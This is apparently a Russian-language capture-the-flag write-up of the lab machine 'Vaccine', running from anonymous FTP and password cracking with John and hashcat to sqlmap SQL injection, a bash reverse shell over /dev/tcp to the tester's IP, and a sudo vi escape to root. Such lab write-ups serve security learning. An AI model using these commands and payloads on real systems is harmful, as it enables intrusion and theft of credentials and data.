@@ -1,0 +1,500 @@
+*** VACCINE 
+ВАКЦИНА
+	
+	- Тестирование на проникновение не простое, оно требует большого количества 
+	технических знаний и способности мыслить нестандартно. Иногда вы найдете 
+	простые, но опасные уязвимости, в других случаях вы найдете уязвимости, в 
+	которых существуют общедоступные эксплойты, которые вы можете использовать, 
+	чтобы получить легкий доступ к системе. Реальность такова, что в большинстве 
+	случаев вам нужно будет иметь много различных уязвимостей и неправильных 
+	конфигураций, когда вам придется связать их все вместе, чтобы получить доступ к
+	системе целевой машины, или у вас будет система, в которой нет уязвимостей. , 
+	но у него слабый пароль, который может предоставить вам доступ к системе. 
+	Вакцина — это машина, которая учит нас, что перечисление всегда является 
+	ключом, даже если система кажется безопасной. Кроме того, это также учит нас 
+	тому, насколько важен взлом паролей
+
+	
+	### ENUMERATION
+	ПЕРЕЧИСЛЕНИЕ
+		
+		- Как обычно начинаем со сканирования NMAP 
+			
+			@ sudo nmap -sC -sV {target_ip}
+				
+				21/tcp open  ftp     vsftpd 3.0.3
+					ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+				22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+				80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+		- Открыто три порта: 21 22 80. Поскольку у нас нет учетных данных для
+		службы SSH, мы начинаем с перечисления порта 21, поскольку Nmap
+		показывает, что он позволяет анонимный вход 
+			
+			@ ftp {target_ip} 
+				
+				Connected to 10.129.21.5.
+				220 (vsFTPd 3.0.3)
+				Name (10.129.21.5:mwuckert): anonymous
+				Password: anon123	# Допускается вводить любой пароль и даже
+								  	оставить поле пустым так как вход ANONIM
+
+				230 Login successful.
+				Remote system type is UNIX.
+				Using binary mode to transfer files.
+
+				@ftp> dir 
+					
+					backup.zip
+					
+					# Видим, что присутствует файл
+				
+				@ftp> get backup.zip 
+					
+					# файл сохраняется в папку откуда было установленно
+					соединение
+
+				@ftp> quit 
+
+		- Попробуем разархивировать скачанный архив
+			
+			@ ls
+				
+				backup.zip
+
+			@ unzip backup.zip 
+				
+				Archive:  backup.zip 
+				[backup.zip] index.php password: Password123
+
+		- Сжатый архив запрашивает у нас пароли. Мы попробуем пару основных
+		паролей, чтобы увидеть, позволит ли он нам войти
+				
+				password incorrect--reenter: 12345abc
+				password incorrect--reenter: 123456789a
+
+				# не повезло 
+
+		- Придется как-то взломать пароль. Инструмент, который будем использовать
+		для этой задачи, называется John The Ripper 
+			
+			John the Ripper — бесплатная программа для взлома паролей. 
+			Первоначально разработанная для операционной системы Unix, она может 
+			работать на пятнадцати различных платформах (одиннадцать из которых 
+			являются версиями Unix, DOS, Win32, BeOS и OpenVMS, зависящими от 
+			архитектуры). Это одна из наиболее часто используемых программ для 
+			проверки и взлома паролей, поскольку она объединяет несколько 
+			взломщиков паролей в один пакет, автоматически определяет типы хэшей 
+			паролей и включает настраиваемый взломщик. Он может работать с 
+			различными форматами зашифрованных паролей, включая несколько типов
+			хэшей криптопаролей, наиболее часто встречающихся в различных версиях 
+			Unix (на основе DES, MD5 или Blowfish), Kerberos AFS и хэшей LM для 
+			Windows NT/2000/XP/2003. Дополнительные модули расширили его возможности, 
+			включив хэши паролей на основе MD4 и пароли, хранящиеся в LDAP, 
+			MySQL и других
+
+			!!! FOR INSTALL MANUAL GO TO RESPONDER PROJECT
+
+		- Чтобы успешно взломать пароль, нам нужно будет преобразовать 
+		ZIP -> HASH, используя zip2john модуль, который входит в состав
+		John The Ripper 
+			
+			@ zip2john backup.zip > hashes
+				ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
+				ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
+				NOTE: It is assumed that all files in each archive have the same password.
+
+			@ ls 
+				
+				backup.zip	hashes 
+
+			@ cat hashes 
+
+				backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip
+				
+		- Теперь мы набираем следующую команду 
+
+			@ sudo john -wordlist=john -wordlist=/tier1/appointment/SecLists/Passwords/Leaked-Databases/rockyou-75.txt hashes
+				
+				# Таким образом он john загрузит список слов и выполнит атаку
+				грубой силы против хэша, хранящегося в файле hashes
+
+				741852963        (backup.zip)
+				Use the "--show" option to display all of the cracked passwords reliably 
+
+			@ sudo john --show hashes 
+				
+				backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+				1 password hash cracked, 0 left 
+
+				
+		
+		- Мы видим взломанный пароль: 741852963. Теперь извлечем файлы 
+			
+			@ unzip backup.zip
+				
+				Archive:  backup.zip
+				[backup.zip] index.php password: 741852963
+				inflating: index.php
+				inflating: style.css
+			
+			@ ls -la
+				
+				-rw-r--r-- 1 mwuckert mwuckert 2533 May 27 17:07 backup.zip
+				-rw-r--r-- 1 mwuckert mwuckert 2594 Feb  3  2020 index.php
+				-rw-r--r-- 1 mwuckert mwuckert 3274 Feb  3  2020 style.css
+
+		- Сейчас прочитаем файлы
+			
+			@ cat index.php | grep -i password
+				
+				if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+
+				# Можно заметить учетные данные, которые могли бы использовать
+				пароль кажется хэшированным 
+
+
+		- Попробуем опеределить тип хэша при помощи hashid
+			
+			## HASHID INSTALL 
+				
+				https://github.com/psypanda/hashID
+
+				OR 
+					
+				pip install hashid 
+				pip install --upgrade hashid 
+
+			---------------------------------
+			
+			python3 -m hashid 2cb42f8734ea607eefed3b70af13bbd3
+
+			OR
+
+			hashid 2cb42f8734ea607eefed3b70af13bbd3
+				
+				Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
+				[+] MD2
+				[+] MD5
+				[+] MD4
+				... and more 
+				#  Он предоставляет огромный список возможных хешей, однако сначала
+				проверим MD5
+
+		- Поместим хэш в текстовый файл с именем hash, а затем взломаем его 
+		с помощью hashcat 
+			
+			@ echo 2cb42f8734ea607eefed3b70af13bbd3 > hash 
+			
+			### INSTALL OpenCL without AUR 
+				
+				- Сперва необходимо установить среду выполнения OpenCL для AMD
+				
+					https://wiki.archlinux.orgi/title/GPGPU#AMD/ATI
+
+					@ sudo pacman -S clinfo # полезная утилита  
+
+				@ sudo pacman -S opencl-mesa intel-compute-runtime 
+
+					# Эта среда имеет нестабильный драйвер 	
+					@ sudo pacman -Rs opencl-mesa 
+			
+			### INSTALL OpenCL FROM AUR 
+				
+				https://aur.archlinux.org/opencl_legacy_amdgpu-pro.git
+
+				cd opencl_legacy_amdgpu-pro
+				makepkg -c -s 
+				sudo pacman -U opencl-legacy-amdgpu-pro-22.10.1_1401426-1-x86_64.pkg.tar.zst
+
+				
+			### INSTALL HASHCAT
+
+				@ sudo pacman -S hashcat 
+					
+				- Будем использовать rockyo.txt.tar.gz from SecList/Password/..
+
+					@ hashcat -a 0 -m 0 hash rockyo.txt
+						
+						2cb42f8734ea607eefed3b70af13bbd3:qwerty789
+
+						!!!!!!!! 
+
+		- HASHCAT взломал пароль qwerty789. Запустим Web Browser 
+			
+			http://{target_ip}
+				
+				Открылась форма авторизации 
+					
+				Username: admin
+				Password: qwerty789
+
+		
+		- Успешно!!! Попадаем на url
+			
+			http://{target_ip}/dashboard.php
+
+
+	### FOOTHOLD
+	ПЛАЦДАРМ
+
+		- В Dashboard нет ничего особенного, зато есть каталог, который
+		может быть связан с базой данных. Создадим любой запрос в строке поиска
+		набираю слово
+			
+			Hello 
+			
+			http://{target_ip}/dashboard.php?search=hello
+
+		- Проверив URL мы видим, что есть переменная @search, которая отвечает
+		за поиск по каталогу.  Мы могли бы протестировать его, чтобы увидеть
+		можно ли вводить SQL запросы, но вместо того, чтобы делать это вручную
+		можно воспользоваться инструментов под названием SQLMAP 
+			
+			SQLmap — это инструмент с открытым исходным кодом, используемый при 
+			тестировании на проникновение для обнаружения и использования 
+			недостатков SQL-инъекций. SQLmap автоматизирует процесс обнаружения 
+			и использования SQL-инъекций. Атаки SQL Injection могут получить 
+			контроль над базами данных, использующими SQL 
+
+
+
+		### INSTALL SQLMAP 
+			
+			sudo pacman -S sqlmap
+			
+		- Мы предоставим URL-адрес и файл cookie для sqlmap, чтобы он мог найти
+		уязвимость. Причина по которой мы должны предоставить файл cookie
+		связана с аутентификацией 
+
+		- Чтобы получить файл COOKIE, мы можем перехватить любой запрос в 
+		BURPSUITE и получить его оттуда, однако вы можете установить отличное
+		расширение для своего веб-браузера под названием 
+			
+			cookie-editor 
+
+			For firefox:
+				
+				https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
+		
+		- Файлы Cookie в Http-сообщениях запросов обычно устанавливаются 
+		следующим образом 
+			
+			PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1
+
+					
+		- Зная это, вот как должен выглядеть наш синтаксис sqlmap 
+			
+			sqlmap -u 'http://{target_ip}/dashboard.php?search=hello' \
+				-- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"
+
+		- Parameter: search (GET)
+			Type: boolean-based blind
+			Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+			Payload: search=hello' AND (SELECT (CASE WHEN (1910=1910) THEN NULL ELSE CAST((CHR(110)||CHR(81)||CHR(73)||CHR(84)) AS NUMERIC) END)) IS NULL-- PCHN
+			...
+
+		- Из этого вывода важно следующее.
+		Параметр GET "поиск" уязвим. Вы хотите продолжить тестировать другеи
+		(если есть)?[Y/n]
+		Инструмент подтвердил, что цель уязвима для SQL-injection и это все,
+		что нам нужно знать. Мы запустим sqlmap еще раз, где собираемся
+		указать --os-shell флаг, для выполнения командной иньекции 
+			
+			sqlmap -u 'http://{target_ip}/dashboard.php?search=hello' \
+				-- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell 
+
+		- Мы получили оболочку, однако она не очень стабильна и интерактивна
+		Чтобы сделать его более стабильным, мы будем использовать следующую
+		полезную нагрузку 
+			
+			os-shell> bash -c "bash -i>&/dev/tcp/{MY_MACHINE_IP}/443 0>&1"
+				
+				[15:24:36] [WARNING] turning off pre-connect mechanism because of connection reset(s)
+				[15:24:36] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
+
+			### MY MACHINE
+				
+				- Включим прослушиватель NETCAT на 443 порту 
+				sudo nc -lvnp 443 
+
+				Connection from 10.129.32.71:40978
+				bash: cannot set terminal process group (1996): Inappropriate ioctl for device
+				bash: no job control in this shell
+					
+				postgres@vaccine:/var/lib/postgresql/11/main$ 
+
+		- Мы получили точку опоры, быстро сделаем нашу оболочку интерактивной
+
+			postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c \
+			'import pty;pty.spawn("/bin/bash")'
+				
+				<ain$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+			postgre@vaccine:/var/lib/postgresql/11/main$ CTRL+Z			
+			postgre@vaccine:/var/lib/postgresql/11/main$ stty raw -echo			
+			postgre@vaccine:/var/lib/postgresql/11/main$ fg	
+			postgre@vaccine:/var/lib/postgresql/11/main$ export TERM=xterm			
+
+		- Теперь у нас есть полностью интерактивная оболочка 
+			
+			postgre@vaccine:/var/lib/postgresql/11/main$ ls   
+
+				base	      pg_multixact  pg_stat	 PG_VERSION	       postmaster.pid
+				global	      pg_notify     pg_stat_tmp  pg_wal
+				pg_commit_ts  pg_replslot   pg_subtrans  pg_xact
+				pg_dynshmem   pg_serial     pg_tblspc	 postgresql.auto.conf
+				pg_logical    pg_snapshots  pg_twophase  postmaster.opts
+			 	
+			postgre@vaccine:/var/lib/postgresql/11/main$ cd ..  	
+			postgre@vaccine:/var/lib/postgresql/11$ ls -l   	
+				
+				drwx------ 19 postgres postgres 4096 May 28 14:45 main
+
+			postgre@vaccine:/var/lib/postgresql/11$ cd .. 
+			postgre@vaccine:/var/lib/postgresql$ ls 
+				
+				user.txt    
+			
+			postgre@vaccine:/var/lib/postgresql$ cat user.txt
+				
+				ec9b13ca4d6229cd5cc1e09980965bf7 
+			!!! Флаг пользователя найден
+
+	### Privilege Escalation
+	Повышение привилегий
+		
+		- Мы пользователь postgres, но мы не знаем пароль от него, а значит,
+		не можем проверить наш sudo
+			
+			postgre@vaccine:/var/lib/postgresql$ sudo -l 
+			[sudo] password for postgres: 
+
+
+
+		- Мы попробуем нейти пароль в /var/www/html/ каталоге, так как машина
+		использует как PHP, так и SQL, это значит, что должны быть учетные
+		данные в открытом месте 
+			
+			postgre@vaccine:/var/lib/postgresql$ cd /var/www/html/
+			
+			postgre@vaccine:/var/www/html$ ls -ca 
+				
+				.   index.php	   license.txt	bg.png	       dashboard.js
+				..  dashboard.php  style.css	dashboard.css
+			
+		- В dashboard.php мы обнаружили следующее	
+			
+			postgre@vaccine:/var/www/html$ cat dashboard.php | grep -i passw*
+				
+				$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+			PASSWORD: P@s5w0rd!
+
+		- Следует обратить внимание, что оболочка может внезапно выключаться,
+		вместо того, чтобы заново выполнять эксплоит, мы будем использовать 
+		SSH для входа в систему 
+			
+			### INSTALL SSH
+				sudo pacman -S ssh
+
+			ssh postgres@{target_ip}
+			The authenticity of host '10.129.32.71 (10.129.32.71)' can't be established.
+			ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
+			This key is not known by any other names
+			Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+			Warning: Permanently added '10.129.32.71' (ED25519) to the list of known hosts.
+			postgres@10.129.32.71's password: P@s5w0rd!
+			Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+				
+				* Documentation:  https://help.ubuntu.com
+				* Management:     https://landscape.canonical.com
+				* Support:        https://ubuntu.com/advantage
+				
+			
+		- Мы будем выводить sudo -l, чтобы узнать какие привилегии у нас есть
+
+			postgres@vaccine:~$ sudo -l
+				
+			Matching Defaults entries for postgres on vaccine:
+				env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+				secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+			User postgres may run the following commands on vaccine:
+				(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf 
+
+		- Итак, у нас есть sudo привилегии для редактирования файла ph_hba.conf
+		с помощью vi, запустив 
+			
+			sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf 
+
+			# Мы перейдем к GTFOBins, чтобы узнать, можем ли мы злоупотреблять
+			этой привилегией 
+				
+				https://gtfobins.github.io/gtfobins/vi/#sudo
+
+			- Если sudo ращрешает запуск двоичного файла от имени суперпользователя
+			он не теряет повывшенные привилегии и может использоваться для доступа
+			к файловой системе, расширения или сохранение привилегированного 
+			доступа
+			
+				sudo vi -c ':!/bin/sh' /dev/null 
+
+		- Выполним повышение
+			
+			postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh /dev/null'
+			[sudo] password for postgres: P@s5w0rd!
+			
+			Sorry, user postgres is not allowed to execute 
+			'/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' 
+			as root on vaccine. 
+
+			- TRANSLATE Извините, пользователю postgres не разрешено выполнять
+			данную команду от имени суперпользователя
+
+		- Мы не можем выполнить следующую команду, потому-что SUDO ограничивается
+		только /bin/vi /etc/postgresql/11/main/pg_hba.conf
+		Согласно GTFOBins, есть альтернативный способ:
+			
+			vi 
+			:set shell=/bin/sh
+			:shell 
+
+		- Так что мы также выполним это 
+			
+			postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf 
+			
+			### УСПЕШНО ОТКРЫЛСЯ 
+			"/etc/postgresql/11/main/pg_hba.conf" 99L, 4659C
+
+		- Нам удалось открыть VI Editor в качестве суперпользователя с 
+		привилегиями root:
+		Теперь будем нажимать : чтобы установить инструкцию внутри VI 
+			
+			:set shell=/bin/sh 
+			:shell
+
+			# whoami
+				
+				root
+			# id 
+				
+				uid=0(root) gid=0(root) groups=0(root)
+
+
+			# cd /root 	
+			# bash 
+				
+				root@vaccine:~# ls -ac 
+					
+					.  .viminfo  .ssh  .vim  ..  snap  .local  .gnupg  .cache  root.txt  .bashrc  .profile  pg_hba.conf  .bash_history
+
+				root@vaccine:~# cat root.txt
+					
+					dd6e058e814260bc70e9bbdef2715849
+
+				root@vaccine:~#
+		
+				
+
+			!!! ROOT FLAG WAS FOUNDE 
